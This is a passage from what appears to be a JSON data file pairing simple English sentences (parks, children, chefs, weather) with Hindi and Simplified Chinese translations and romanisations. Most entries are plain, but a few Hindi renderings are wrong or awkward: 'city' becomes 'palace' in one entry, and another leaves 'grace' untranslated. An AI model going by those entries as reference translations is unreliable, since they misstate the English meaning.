            "the new park was filled with colorful flowers and tall trees.": {
                "Hindi": "नया पार्क रंग-बिरंगे फूलों और ऊंचे पेड़ों से भरा हुआ था। (Naya park rang-birange phoolon aur oonche pedon se bhara hua tha.)",
                "Chinese (Simplified)": "新公园里满是五彩缤纷的花朵和高大的树木。 (Xīn gōngyuán lǐ mǎn shì wǔcǎi bīnfēn de huāduǒ hé gāodà de shùmù.)"
            },
            "the cat curled up on the couch to take a nap.": {
                "Hindi": "बिल्ली सोफे पर घूम कर आराम से सोने के लिए लेट गई। (Billi sofe par ghoom kar aaram se sone ke liye let gayi.)",
                "Chinese (Simplified)": "猫蜷缩在沙发上打盹。 (Māo quán suō zài shāfā shàng dǎdǔn.)"
            },
            "he gave a heartfelt speech at the graduation ceremony.": {
                "Hindi": "उसने स्नातक समारोह में दिल से एक भाषण दिया। (Usne snatak samaroh mein dil se ek bhashan diya.)",
                "Chinese (Simplified)": "他在毕业典礼上发表了发自内心的演讲。 (Tā zài bìyè diǎnlǐ shàng fābiǎole fā zì nèixīn de yǎnjiǎng.)"
            },
            "the magician amazed the audience with his tricks.": {
                "Hindi": "जादूगर ने अपने जादू से दर्शकों को चौंका दिया। (Jadugar ne apne jaadu se darshako ko chonka diya.)",
                "Chinese (Simplified)": "魔术师用他的把戏让观众惊叹。 (Móshùshī yòng tā de bǎxì ràng guānzhòng jīngtàn.)"
            },
            "the children eagerly waited for the ice cream truck to arrive.": {
                "Hindi": "बच्चे बेसब्री से आइस क्रीम ट्रक के आने का इंतजार कर रहे थे। (Bachche besabri se ice cream truck ke aane ka intezaar kar rahe the.)",
                "Chinese (Simplified)": "孩子们迫不及待地等着冰淇淋车的到来。 (Háizimen pò bù jí dài de děngzhe bīngqílín chē de dào lái.)"
            },
            "the professor explained the complex theory in simple terms.": {
                "Hindi": "प्रोफेसर ने जटिल सिद्धांत को आसान शब्दों में समझाया। (Professor ne jatil siddhant ko aasaan shabdon mein samjhaya.)",
                "Chinese (Simplified)": "教授用简单的术语解释了复杂的理论。 (Jiàoshòu yòng jiǎndān de shùyǔ jiěshìle fùzá de lǐlùn.)"
            },
            "the old man shared stories of his youth with the children.": {
                "Hindi": "बूढ़े आदमी ने बच्चों के साथ अपनी जवानी की कहानियाँ साझा की। (Boodhe aadmi ne bachon ke saath apni jawani ki kahaniyan saanjha ki.)",
                "Chinese (Simplified)": "老人和孩子们分享了他年轻时的故事。 (Lǎorén hé háizimen fēnxiǎngle tā niánqīng shí de gùshì.)"
            },
            "the children ran outside to play as soon as school ended.": {
                "Hindi": "जैसे ही स्कूल खत्म हुआ, बच्चे बाहर खेलने दौड़ पड़े। (Jaise hi school khatam hua, bachche bahar khelne daud pade.)",
                "Chinese (Simplified)": "学校一放学，孩子们就跑出去玩了。 (Xuéxiào yī fàngxué, háizimen jiù pǎo chūqù wánle.)"
            },
            "the author spent years writing the novel before publishing it.": {
                "Hindi": "लेखक ने उपन्यास लिखने में वर्षों बिताए, फिर उसे प्रकाशित किया। (Lekhak ne upanyaas likhne mein varsho bitaye, phir use prakaashit kiya.)",
                "Chinese (Simplified)": "作者花了几年时间写这本小说，然后才出版。 (Zuòzhě huāle jǐ nián shíjiān xiě zhè běn xiǎoshuō, ránhòu cái chūbǎn.)"
            },
            "the chef carefully garnished the dish with fresh herbs.": {
                "Hindi": "शेफ ने डिश को ताजे हर्ब्स से सजा कर पेश किया। (Chef ne dish ko tazey herbs se saza kar pesh kiya.)",
                "Chinese (Simplified)": "厨师小心翼翼地用新鲜香草装饰了菜肴。 (Chúshī xiǎoxīn yìyì de yòng xīnxiān xiāngcǎo zhuāngshìle càiyáo.)"
            },
            "the doctor advised the patient to rest for a few days.": {
                "Hindi": "डॉक्टर ने मरीज को कुछ दिनों तक आराम करने की सलाह दी। (Doctor ne mareez ko kuch dinon tak aaram karne ki salah di.)",
                "Chinese (Simplified)": "医生建议病人休息几天。 (Yīshēng jiànyì bìngrén xiūxí jǐ tiān.)"
            },
            "the storm caused significant damage to the village.": {
                "Hindi": "तूफान ने गांव में भारी नुकसान पहुँचाया। (Toofan ne gaon mein bhaari nuksan pahunchaya.)",
                "Chinese (Simplified)": "暴风雨给村庄带来了严重的破坏。 (Bàofēngyǔ gěi cūnzhuāng dàilái le yánzhòng de pòhuài.)"
            },
            "the teacher explained the math problem step by step.": {
                "Hindi": "शिक्षक ने गणित की समस्या को चरण दर चरण समझाया। (Shikshak ne ganit ki samasya ko charan dar charan samjhaya.)",
                "Chinese (Simplified)": "老师一步一步地解释了数学问题。 (Lǎoshī yī bù yī bù de jiěshìle shùxué wèntí.)"
            },
            "the bird flew gracefully across the sky.": {
                "Hindi": "पक्षी आकाश में सुंदरता से उड़ते हुए गया। (Pakshi aakash mein sundarta se udte hue gaya.)",
                "Chinese (Simplified)": "鸟优雅地飞过了天空。 (Niǎo yōuyǎ de fēiguòle tiānkōng.)"
            },
            "the children sang songs around the campfire.": {
                "Hindi": "बच्चों ने अलाव के चारों ओर गीत गाए। (Bachon ne alav ke chaaron or geet gaaye.)",
                "Chinese (Simplified)": "孩子们围着篝火唱歌。 (Háizimen wéizhe gōuhuǒ chànggē.)"
            },
            "the artist painted a mural on the side of the building.": {
                "Hindi": "कलाकार ने इमारत की दीवार पर एक भित्ति चित्र बनाया। (Kalakar ne imarat ki deewar par ek bhitti chitra banaya.)",
                "Chinese (Simplified)": "艺术家在建筑物的墙面上画了一幅壁画。 (Yìshùjiā zài jiànzhùwù de qiángmiàn shàng huàle yī fú bìhuà.)"
            },
            "the athlete trained every day to improve his skills.": {
                "Hindi": "खिलाड़ी ने अपनी क्षमताओं में सुधार के लिए रोज़ अभ्यास किया। (Khiladi ne apni kshamataon mein sudhaar ke liye roz abhyas kiya.)",
                "Chinese (Simplified)": "运动员每天都训练以提高他的技能。 (Yùndòngyuán měitiān dōu xùnliàn yǐ tígāo tā de jìnéng.)"
            },
            "the children eagerly awaited their turn to perform on stage.": {
                "Hindi": "बच्चे मंच पर प्रदर्शन करने का अपना बारी का बेसब्री से इंतजार कर रहे थे। (Bachche manch par pradarshan karne ka apna baari ka besabri se intezaar kar rahe the.)",
                "Chinese (Simplified)": "孩子们迫不及待地等待轮到他们在舞台上表演。 (Háizimen pò bù jí dài de děngdài lún dào tāmen zài wǔtái shàng biǎoyǎn.)"
            },
            "the city lights twinkled as the night fell.": {
                "Hindi": "रात होने पर शहर की बत्तियाँ चमकने लगीं। (Raat hone par shahar ki battiyaan chamakne lagi.)",
                "Chinese (Simplified)": "夜幕降临时，城市的灯光闪烁。 (Yèmù jiànglín shí, chéngshì de dēngguāng shǎnshuò.)"
            },
            "she danced with grace at the recital.": {
                "Hindi": "वह रचनामंच पर grace के साथ नृत्य कर रही थी। (Vah rachnamanch par grace ke saath nritya kar rahi thi.)",
                "Chinese (Simplified)": "她在音乐会上优雅地跳舞。 (Tā zài yīnyuè huì shàng yōuyǎ de tiàowǔ.)"
            },
            "they enjoyed a peaceful walk along the beach at sunrise.": {
                "Hindi": "उन्होंने सूर्योदय के समय समुद्र तट पर एक शांतिपूर्ण सैर का आनंद लिया। (Unhone suryoday ke samay samundra tat par ek shaantipoorn sair ka anand liya.)",
                "Chinese (Simplified)": "他们在日出时享受了沿海滩的宁静散步。 (Tāmen zài rìchū shí xiǎngshòule yán hǎitān de níngjìng sànbù.)"
            },
            "the dog barked loudly when the stranger approached the house.": {
                "Hindi": "कुत्ता जोर से भौंका जब अजनबी घर के पास आया। (Kutta zor se bhonka jab ajnabi ghar ke paas aaya.)",
                "Chinese (Simplified)": "当陌生人接近房子时，狗大声叫了起来。 (Dāng mòshēngrén jiējìn fángzi shí, gǒu dà shēng jiàole qǐlái.)"
            },
            "he was able to fix the car after a few attempts.": {
                "Hindi": "कुछ प्रयासों के बाद वह कार को ठीक करने में सक्षम था। (Kuch prayaason ke baad vah car ko theek karne mein saksham tha.)",
                "Chinese (Simplified)": "他经过几次尝试后终于修好了车。 (Tā jīngguò jǐ cì chángshì hòu zhōngyú xiū hǎo le chē.)"
            },
            "the sun set behind the mountains, casting a golden glow over the valley.": {
                "Hindi": "सूरज पहाड़ों के पीछे अस्त हो गया, घाटी पर सुनहरा आभा छोड़ता हुआ। (Suraj pahadon ke peeche ast ho gaya, ghaati par sunahra aabha chhodta hua.)",
                "Chinese (Simplified)": "太阳在山后落下，金色的光辉洒在山谷上。 (Tàiyáng zài shān hòu luò xià, jīnsè de guānghuī sǎ zài shāngǔ shàng.)"
            },
            "the crowd cheered as the team scored the winning goal.": {
                "Hindi": "जब टीम ने विजयी गोल किया, तो भीड़ ने उत्साह से जयकारे लगाए। (Jab team ne vijayi goal kiya, to bheed ne utsah se jaykaare lagaye.)",
                "Chinese (Simplified)": "当队伍进了决定胜负的进球时，人群欢呼起来。 (Dāng duìwǔ jìnle juédìng shèngfù de jìnqiú shí, rénqún huānhū qǐlái.)"
            },
            "the singer captivated the audience with her powerful voice.": {
                "Hindi": "गायक ने अपनी मजबूत आवाज से दर्शकों को मंत्रमुग्ध कर दिया। (Gaayak ne apni mazboot awaaz se darshako ko mantramugdh kar diya.)",
                "Chinese (Simplified)": "歌手以她强大的嗓音吸引了观众。 (Gēshǒu yǐ tā qiángdà de sǎngyīn xīyǐnle guānzhòng.)"
            },
            "they enjoyed a delicious meal at the new restaurant.": {
                "Hindi": "उन्होंने नए रेस्तरां में एक स्वादिष्ट भोजन का आनंद लिया। (Unhone naye restoran mein ek swaadisht bhojan ka anand liya.)",
                "Chinese (Simplified)": "他们在新餐厅享用了美味的餐点。 (Tāmen zài xīn cāntīng xiǎngyòngle měiwèi de cāndiǎn.)"
            },
            "the baby giggled as the puppy licked her face.": {
                "Hindi": "बेबी ने हंसी उड़ाई जब पप्पी ने उसका चेहरा चाटा। (Baby ne hansi udaayi jab puppy ne uska chehra chata.)",
                "Chinese (Simplified)": "小宝宝咯咯笑着，刚刚小狗舔了她的脸。 (Xiǎo bǎobǎo gēgē xiàozhe, gānggāng xiǎo gǒu tiǎnle tā de liǎn.)"
            },
            "he carefully organized his study materials before the exam.": {
                "Hindi": "उसने परीक्षा से पहले अपने अध्ययन सामग्री को सावधानीपूर्वक व्यवस्थित किया। (Usne pariksha se pehle apne adhyayan saamagri ko saavdhaanipurvak vyavasthit kiya.)",
                "Chinese (Simplified)": "他在考试前小心地整理了自己的学习资料。 (Tā zài kǎoshì qián xiǎoxīn de zhěnglǐle zìjǐ de xuéxí zīliào.)"
            },
            "the clock struck midnight, signaling the start of the new year.": {
                "Hindi": "घड़ी ने आधी रात को बजाया, नए साल की शुरुआत का संकेत देते हुए। (Ghadi ne aadhi raat ko bajaya, naye saal ki shuruat ka sanket dete hue.)",
                "Chinese (Simplified)": "钟声敲响了午夜，标志着新的一年的开始。 (Zhōngshēng qiāo xiǎngle wǔyè, biāozhìzhe xīn de yī nián de kāishǐ.)"
            },
            "the student worked hard to complete the project on time.": {
                "Hindi": "छात्र ने परियोजना को समय पर पूरा करने के लिए कड़ी मेहनत की। (Chhaatr ne pariyojna ko samay par poora karne ke liye kadi mehnat ki.)",
                "Chinese (Simplified)": "学生努力工作，按时完成了项目。 (Xuéshēng nǔlì gōngzuò, ànshí wánchéngle xiàngmù.)"
            },
            "the artist painted a beautiful landscape on the canvas.": {
                "Hindi": "कलाकार ने कैनवास पर एक सुंदर परिदृश्य चित्रित किया। (Kalaakar ne canvas par ek sundar paridrishya chitrit kiya.)",
                "Chinese (Simplified)": "艺术家在画布上画了一幅美丽的风景。 (Yìshùjiā zài huàbù shàng huàle yī fú měilì de fēngjǐng.)"
            },
            "he made a promise to always be there for his friends.": {
                "Hindi": "उसने अपने दोस्तों के लिए हमेशा वहाँ रहने का वादा किया। (Usne apne doston ke liye hamesha wahan rehne ka wada kiya.)",
                "Chinese (Simplified)": "他承诺永远会在那里支持他的朋友们。 (Tā chéngnuò yǒngyuǎn huì zài nàlǐ zhīchí tā de péngyǒumen.)"
            },
            "the mountain air was fresh and invigorating.": {
                "Hindi": "पहाड़ों की हवा ताजगी और ताजगी से भरी हुई थी। (Pahaadon ki hawa taazgi aur taazgi se bhari hui thi.)",
                "Chinese (Simplified)": "山上的空气新鲜而令人振奋。 (Shān shàng de kōngqì xīnxiān ér lìng rén zhènfèn.)"
            },
            "the children laughed as they played in the park.": {
                "Hindi": "बच्चे हँसते हुए पार्क में खेल रहे थे। (Bachche hanste hue park mein khel rahe the.)",
                "Chinese (Simplified)": "孩子们在公园里玩耍时笑了。 (Háizimen zài gōngyuán lǐ wánshuǎ shí xiàole.)"
            },
            "the scientist made a groundbreaking discovery in his research.": {
                "Hindi": "वैज्ञानिक ने अपने अनुसंधान में एक क्रांतिकारी खोज की। (Vaigyanik ne apne anusandhan mein ek kraantikaari khoj ki.)",
                "Chinese (Simplified)": "科学家在他的研究中做出了重大发现。 (Kēxuéjiā zài tā de yánjiū zhōng zuòchūle zhòngdà fāxiàn.)"
            },
            "the rain created a peaceful ambiance in the forest.": {
                "Hindi": "बारिश ने जंगल में एक शांतिपूर्ण वातावरण उत्पन्न किया। (Baarish ne jangal mein ek shaantipoorn vatavaran utpann kiya.)",
                "Chinese (Simplified)": "雨水在森林中创造了宁静的氛围。 (Yǔshuǐ zài sēnlín zhōng chuàngzàole níngjìng de fēnwéi.)"
            },
            "he enjoys reading books in his free time.": {
                "Hindi": "वह अपने फुर्सत के समय में किताबें पढ़ना पसंद करता है। (Vah apne fursat ke samay mein kitaabein padhna pasand karta hai.)",
                "Chinese (Simplified)": "他喜欢在空闲时间阅读书籍。 (Tā xǐhuān zài kòngxián shíjiān yuèdú shūjí.)"
            },
            "the crowd gathered in excitement for the concert.": {
                "Hindi": "भीड़ कंसर्ट के लिए उत्तेजना के साथ इकट्ठा हुई। (Bheed concert ke liye uttejana ke saath ikattha hui.)",
                "Chinese (Simplified)": "人群激动地聚集在一起等待音乐会。 (Rénqún jīdòng de jùjí zài yīqǐ děngdài yīnyuè huì.)"
            },
            "she found a beautiful seashell on the shore.": {
                "Hindi": "उसने समुद्र के किनारे एक सुंदर शंख पाया। (Usne samundra ke kinare ek sundar shankh paaya.)",
                "Chinese (Simplified)": "她在海岸上找到了一个美丽的贝壳。 (Tā zài hǎi'àn shàng zhǎodàole yīgè měilì de bèiké.)"
            },
            "the chef prepared a delicious meal for the guests.": {
                "Hindi": "शेफ ने मेहमानों के लिए स्वादिष्ट भोजन तैयार किया। (Chef ne mehmanon ke liye swaadisht bhojan taiyar kiya.)",
                "Chinese (Simplified)": "厨师为客人准备了一顿美味的餐点。 (Chúshī wèi kèrén zhǔnbèile yī dùn měiwèi de cāndiǎn.)"
            },
            "the students eagerly awaited their final exam results.": {
                "Hindi": "छात्र अपने अंतिम परीक्षा के परिणाम का बेसब्री से इंतजार कर रहे थे। (Chhaatr apne antim pariksha ke parinaam ka besabri se intezaar kar rahe the.)",
                "Chinese (Simplified)": "学生们迫不及待地等待他们的期末考试结果。 (Xuéshēngmen pò bù jí dài de děngdài tāmen de qīmò kǎoshì jiéguǒ.)"
            },
            "the dog barked loudly at the stranger.": {
                "Hindi": "कुत्ते ने अजनबी पर जोर से भौंका। (Kutte ne ajnabi par zor se bhonka.)",
                "Chinese (Simplified)": "狗对陌生人大声吠叫。 (Gǒu duì mòshēngrén dàshēng fèi jiào.)"
            },
            "they traveled to the mountains for their vacation.": {
                "Hindi": "उन्होंने अपनी छुट्टियों के लिए पहाड़ों की यात्रा की। (Unhone apni chuttiyon ke liye pahaadon ki yatra ki.)",
                "Chinese (Simplified)": "他们为度假去了山区。 (Tāmen wèi dùjià qùle shānqū.)"
            },
            "the movie was filled with thrilling action scenes.": {
                "Hindi": "फिल्म रोमांचक एक्शन दृश्यों से भरी हुई थी। (Film romaanchak action drishyon se bhari hui thi.)",
                "Chinese (Simplified)": "电影充满了令人兴奋的动作场面。 (Diànyǐng chōngmǎnle lìng rén xīngfèn de dòngzuò chǎngmiàn.)"
            },
            "she wore a beautiful red dress to the party.": {
                "Hindi": "उसने पार्टी में एक सुंदर लाल ड्रेस पहनी। (Usne party mein ek sundar laal dress pehni.)",
                "Chinese (Simplified)": "她穿着一件美丽的红色裙子参加派对。 (Tā chuānzhuó yī jiàn měilì de hóngsè qúnzi cānjiā pàiduì.)"
            },
            "the teacher explained the lesson clearly to the students.": {
                "Hindi": "शिक्षक ने छात्रों को पाठ स्पष्ट रूप से समझाया। (Shikshak ne chhaatron ko paath spasht roop se samjhaya.)",
                "Chinese (Simplified)": "老师清楚地向学生们解释了课文。 (Lǎoshī qīngchǔ de xiàng xuéshēngmen jiěshìle kèwén.)"
            },
            "the children built a sandcastle on the beach.": {
                "Hindi": "बच्चों ने समुद्र तट पर एक बालू का किला बनाया। (Bachchon ne samundra tat par ek baalu ka kila banaya.)",
                "Chinese (Simplified)": "孩子们在沙滩上建了一个沙堡。 (Háizimen zài shātān shàng jiànle yīgè shā bǎo.)"
            },
            "the library is a quiet place to study and read.": {
                "Hindi": "पुस्तकालय अध्ययन और पढ़ाई के लिए एक शांतिपूर्ण स्थान है। (Pustakalay adhyayan aur padhai ke liye ek shaantipoorn sthan hai.)",
                "Chinese (Simplified)": "图书馆是一个安静的地方，用来学习和阅读。 (Túshūguǎn shì yīgè ānjìng de dìfāng, yòng lái xuéxí hé yuèdú.)"
            },
            "the farmer harvested the crops at the end of the season.": {
                "Hindi": "किसान ने मौसम के अंत में फसलें काटी। (Kisaan ne mausam ke ant mein fasle kaati.)",
                "Chinese (Simplified)": "农民在季节结束时收获了庄稼。 (Nóngmín zài jìjié jiéshù shí shōuhuòle zhuāngjià.)"
            },
            "the team celebrated their victory with a party.": {
                "Hindi": "टीम ने अपनी जीत का जश्न एक पार्टी के साथ मनाया। (Team ne apni jeet ka jashn ek party ke saath manaya.)",
                "Chinese (Simplified)": "团队通过聚会庆祝他们的胜利。 (Tuánduì tōngguò jùhuì qìngzhù tāmen de shènglì.)"
            },
            "the sun set over the horizon, painting the sky with colors.": {
                "Hindi": "सूरज क्षितिज पर अस्त हो गया, आकाश को रंगों से रंगते हुए। (Suraj kshitij par ast ho gaya, aakash ko rangon se rangte hue.)",
                "Chinese (Simplified)": "太阳在地平线下沉，给天空涂上了颜色。 (Tàiyáng zài dìpíngxiàn xiàchén, gěi tiānkōng tú shàngle yánsè.)"
            },
            "the park is a great place for a morning jog.": {
                "Hindi": "पार्क सुबह की जॉगिंग के लिए एक बेहतरीन जगह है। (Park subah ki jogging ke liye ek behtareen jagah hai.)",
                "Chinese (Simplified)": "公园是晨跑的好地方。 (Gōngyuán shì chén pǎo de hǎo dìfāng.)"
            },
            "the library has a vast collection of books.": {
                "Hindi": "पुस्तकालय में किताबों का विशाल संग्रह है। (Pustakalay mein kitabon ka vishal sangrah hai.)",
                "Chinese (Simplified)": "图书馆有着大量的书籍收藏。 (Túshūguǎn yǒuzhe dàliàng de shūjí shōucáng.)"
            },
            "the mountain trail was steep and challenging.": {
                "Hindi": "पहाड़ की पगडंडी खड़ी और चुनौतीपूर्ण थी। (Pahaad ki pagdandi khadi aur chunautipurn thi.)",
                "Chinese (Simplified)": "山间小径陡峭且具有挑战性。 (Shān jiān xiǎojìng dǒuqiào qiě jùyǒu tiǎozhàn xìng.)"
            },
            "the company launched a new product in the market.": {
                "Hindi": "कंपनी ने बाजार में एक नया उत्पाद लॉन्च किया। (Company ne bazaar mein ek naya utpad launch kiya.)",
                "Chinese (Simplified)": "公司在市场上推出了新产品。 (Gōngsī zài shìchǎng shàng tuīchūle xīn chǎnpǐn.)"
            },
            "the teacher encouraged the students to ask questions.": {
                "Hindi": "शिक्षक ने छात्रों को सवाल पूछने के लिए प्रोत्साहित किया। (Shikshak ne chhaatron ko sawaal poochhne ke liye protsaahit kiya.)",
                "Chinese (Simplified)": "老师鼓励学生们提出问题。 (Lǎoshī gǔlì xuéshēngmen tíchū wèntí.)"
            },
            "the chef garnished the dish with fresh herbs.": {
                "Hindi": "शेफ ने पकवान को ताजे हर्ब्स से सजाया। (Chef ne pakwan ko taaze herbs se sajaya.)",
                "Chinese (Simplified)": "厨师用新鲜的香草装饰了这道菜。 (Chúshī yòng xīnxiān de xiāngcǎo zhuāngshìle zhè dào cài.)"
            },
            "the concert was filled with energetic performances.": {
                "Hindi": "संगीत कार्यक्रम ऊर्जा से भरी हुई प्रस्तुतियों से भरा हुआ था। (Sangeet karyakram oorja se bhari hui prastutiyon se bhara hua tha.)",
                "Chinese (Simplified)": "音乐会充满了充满活力的表演。 (Yīnyuè huì chōngmǎnle chōngmǎn huólì de biǎoyǎn.)"
            },
            "the dog ran after the ball in the yard.": {
                "Hindi": "कुत्ता यार्ड में गेंद के पीछे दौड़ा। (Kutta yard mein gend ke peeche dauda.)",
                "Chinese (Simplified)": "狗在院子里追着球跑。 (Gǒu zài yuànzi lǐ zhuīzhe qiú pǎo.)"
            },
            "she decorated the room with beautiful flowers.": {
                "Hindi": "उसने कमरे को सुंदर फूलों से सजाया। (Usne kamre ko sundar phoolon se sajaya.)",
                "Chinese (Simplified)": "她用美丽的花朵装饰了房间。 (Tā yòng měilì de huāduǒ zhuāngshìle fángjiān.)"
            },
            "the children enjoyed playing in the snow.": {
                "Hindi": "बच्चों ने बर्फ में खेलकर आनंद लिया। (Bachchon ne baraf mein khelkar anand liya.)",
                "Chinese (Simplified)": "孩子们在雪地里玩得很开心。 (Háizimen zài xuědì lǐ wán dé hěn kāixīn.)"
            },
            "the sun rose over the horizon, signaling a new day.": {
                "Hindi": "सूरज क्षितिज पर उगते हुए, एक नए दिन की शुरुआत का संकेत दिया। (Suraj kshitij par ugte hue, ek naye din ki shuruat ka sanket diya.)",
                "Chinese (Simplified)": "太阳从地平线升起，标志着新的一天的到来。 (Tàiyáng cóng dìpíngxiàn shēngqǐ, biāozhìzhe xīn de yītiān de dào lái.)"
            },
            "he fixed the broken chair in no time.": {
                "Hindi": "उसने टूटे हुए कुर्सी को तुरंत ठीक किया। (Usne toote huye kursi ko turant theek kiya.)",
                "Chinese (Simplified)": "他很快修好了坏掉的椅子。 (Tā hěn kuài xiū hǎole huài diào de yǐzi.)"
            },
            "the teacher gave each student a certificate of achievement.": {
                "Hindi": "शिक्षक ने प्रत्येक छात्र को उपलब्धि प्रमाण पत्र दिया। (Shikshak ne pratyek chhaatr ko uplabdhi pramaan patra diya.)",
                "Chinese (Simplified)": "老师给每个学生颁发了成就证书。 (Lǎoshī gěi měi gè xuéshēng bānfāle chéngjiù zhèngshū.)"
            },
            "the couple enjoyed a romantic dinner by the candlelight.": {
                "Hindi": "जोड़े ने मोमबत्ती की रोशनी में एक रोमांटिक डिनर का आनंद लिया। (Jode ne mombatti ki roshni mein ek romantic dinner ka anand liya.)",
                "Chinese (Simplified)": "这对情侣在烛光下享受了浪漫的晚餐。 (Zhè duì qínglǚ zài zhúguāng xià xiǎngshòule làngmàn de wǎncān.)"
            },
            "the city was lit up beautifully for the festival.": {
                "Hindi": "महल त्योहार के लिए खूबसूरती से सजाया गया था। (Mahal tyohar ke liye khoobsurti se sajaya gaya tha.)",
                "Chinese (Simplified)": "城市为节日装饰得美丽动人。 (Chéngshì wèi jiérì zhuāngshì dé měilì dòngrén.)"
            },
            "the weather was perfect for a day at the beach.": {
                "Hindi": "समुद्र तट पर एक दिन बिताने के लिए मौसम बिल्कुल सही था। (Samundra tat par ek din bitane ke liye mausam bilkul sahi tha.)",
                "Chinese (Simplified)": "天气非常适合去海滩度过一天。 (Tiānqì fēicháng shìhé qù hǎitān dùguò yītiān.)"
            },
            "she painted the fence with a fresh coat of white paint.": {
                "Hindi": "उसने बाड़ को सफेद रंग की ताजा कोट से रंगा। (Usne baad ko safed rang ki taaza coat se ranga.)",
                "Chinese (Simplified)": "她给篱笆刷上了一层新的白漆。 (Tā gěi líbā shuā shàngle yī céng xīn de bái qī.)"
            },
            "the fisherman cast his net into the sea.": {
                "Hindi": "मछुआरे ने अपना जाल समुद्र में फेंका। (Machhuaare ne apna jaal samundra mein phenka.)",
                "Chinese (Simplified)": "渔夫把他的网撒进了大海。 (Yúfū bǎ tā de wǎng sā jìnle dàhǎi.)"
            },
            "the airplane soared high above the clouds.": {
                "Hindi": "विमान बादलों के ऊपर ऊँचाई पर उड़ रहा था। (Vimaan baadlon ke upar unchaai par ud raha tha.)",
                "Chinese (Simplified)": "飞机飞得高高的，穿越了云层。 (Fēijī fēi dé gāo gāo de, chuānyuèle yúncéng.)"
            },
            "the scientist studied the effects of climate change on the environment.": {
                "Hindi": "वैज्ञानिक ने पर्यावरण पर जलवायु परिवर्तन के प्रभाव का अध्ययन किया। (Vaigyanik ne paryavaran par jalvayu parivartan ke prabhav ka adhyayan kiya.)",
                "Chinese (Simplified)": "科学家研究了气候变化对环境的影响。 (Kēxuéjiā yánjiūle qìhòu biànhuà duì huánjìng de yǐngxiǎng.)"
            },
            "the couple walked hand in hand along the beach.": {
                "Hindi": "जोड़े समुद्र तट पर हाथ में हाथ डालकर चल रहे थे। (Jode samundra tat par haath mein haath daalkar chal rahe the.)",
                "Chinese (Simplified)": "这对情侣手牵着手沿着海滩走。 (Zhè duì qínglǚ shǒu qiānzhe shǒu yánzhe hǎitān zǒu.)"
            },
            "the car broke down in the middle of the road.": {
                "Hindi": "गाड़ी सड़क के बीच में खराब हो गई। (Gaadi sadak ke beech mein kharaab ho gayi.)",
                "Chinese (Simplified)": "汽车在路中间抛锚了。 (Qìchē zài lù zhōngjiān pāo mánle.)"
            },
            "the artist created a masterpiece that everyone admired.": {
                "Hindi": "कलाकार ने एक उत्कृष्ट कृति बनाई जिसे सभी ने सराहा। (Kalaakar ne ek utkrsht kruti banayi jise sabhi ne saraha.)",
                "Chinese (Simplified)": "艺术家创作了一部大家都钦佩的杰作。 (Yìshùjiā chuàngzuòle yī bù dàjiā dōu qīnpèi de jiézuò.)"
            },
            "the train arrived on time at the station.": {
                "Hindi": "ट्रेन स्टेशन पर समय पर पहुंची। (Train station par samay par pahunchi.)",
                "Chinese (Simplified)": "火车准时到达了车站。 (Huǒchē zhǔnshí dàodále chēzhàn.)"
            },
            "the children laughed and played in the park.": {
                "Hindi": "बच्चे पार्क में हंसी-मज़ाक कर रहे थे। (Bachche park mein hansi-mazaak kar rahe the.)",
                "Chinese (Simplified)": "孩子们在公园里欢笑玩耍。 (Háizimen zài gōngyuán lǐ huānxiào wánshuǎ.)"
            },
            "he solved the complex problem in no time.": {
                "Hindi": "उसने जटिल समस्या को तुरंत हल कर दिया। (Usne jatil samasya ko turant hal kar diya.)",
                "Chinese (Simplified)": "他很快解决了复杂的问题。 (Tā hěn kuài jiějuéle fùzá de wèntí.)"
            },
            "she gave an insightful speech at the conference.": {
                "Hindi": "उसने सम्मेलन में एक सूझबूझ भरी भाषण दी। (Usne sammelan mein ek soojhboojh bhari bhashan di.)",
                "Chinese (Simplified)": "她在会议上做了一个富有洞察力的演讲。 (Tā zài huìyì shàng zuòle yīgè fùyǒu dòngchálì de yǎnjiǎng.)"
            },
            "the children decorated the Christmas tree with colorful lights.": {
                "Hindi": "बच्चों ने क्रिसमस के पेड़ को रंगीन बत्तियों से सजाया। (Bachchon ne Christmas ke ped ko rangeen battion se sajaya.)",
                "Chinese (Simplified)": "孩子们用五彩缤纷的灯饰装饰了圣诞树。 (Háizimen yòng wǔcǎi bīnfēn de dēngshì zhuāngshìle shèngdàn shù.)"
            },
            "the rain stopped, and the sun came out.": {
                "Hindi": "बारिश रुक गई, और सूरज निकल आया। (Barish ruk gayi, aur suraj nikal aaya.)",
                "Chinese (Simplified)": "雨停了，太阳出来了。 (Yǔ tíngle, tàiyáng chūláile.)"
            },
            "the book was filled with interesting facts and stories.": {
                "Hindi": "किताब दिलचस्प तथ्यों और कहानियों से भरी हुई थी। (Kitaab dilchasp tathyon aur kahaniyon se bhari hui thi.)",
                "Chinese (Simplified)": "这本书充满了有趣的事实和故事。 (Zhè běn shū chōngmǎnle yǒuqù de shìshí hé gùshì.)"
            },
            "the cat curled up on the couch and fell asleep.": {
                "Hindi": "बिल्ली सोफे पर लिपटी और सो गई। (Billi sofe par lipti aur so gayi.)",
                "Chinese (Simplified)": "猫蜷缩在沙发上，睡着了。 (Māo quán suō zài shāfā shàng, shuìzhele.)"
            },
            "the athlete broke the record with an incredible performance.": {
                "Hindi": "एथलीट ने एक अद्वितीय प्रदर्शन के साथ रिकॉर्ड तोड़ा। (Athlete ne ek advitiya pradarshan ke saath record toda.)",
                "Chinese (Simplified)": "运动员凭借出色的表现打破了记录。 (Yùndòngyuán píngjiè chūsè de biǎoxiàn dǎpòle jìlù.)"
            },
            "the room was filled with the sweet aroma of freshly baked cookies.": {
                "Hindi": "कमरा ताजे बेक्ड कुकीज की मीठी खुशबू से भर गया था। (Kamra taze baked cookies ki meethi khushboo se bhar gaya tha.)",
                "Chinese (Simplified)": "房间里弥漫着新鲜烤制的饼干的甜香味。 (Fángjiān lǐ mímànzhe xīnxiān kǎo zhì de bǐnggān de tián xiāngwèi.)"
            },
            "she has a talent for playing musical instruments.": {
                "Hindi": "उसके पास संगीत वाद्ययंत्र बजाने का कौशल है। (Uske paas sangeet vaadyayantra bajane ka kaushal hai.)",
                "Chinese (Simplified)": "她有演奏乐器的天赋。 (Tā yǒu yǎnzòu yuèqì de tiānfù.)"
            },
            "the city was buzzing with excitement during the festival.": {
                "Hindi": "त्योहार के दौरान शहर रोमांच से गूंज रहा था। (Tyohar ke dauran shehar romanch se goonj raha tha.)",
                "Chinese (Simplified)": "在节日期间，城市充满了兴奋的气氛。 (Zài jiérì qījiān, chéngshì chōngmǎnle xīngfèn de qìfēn.)"
            },
            "the chef prepared a delicious meal for the guests.": {
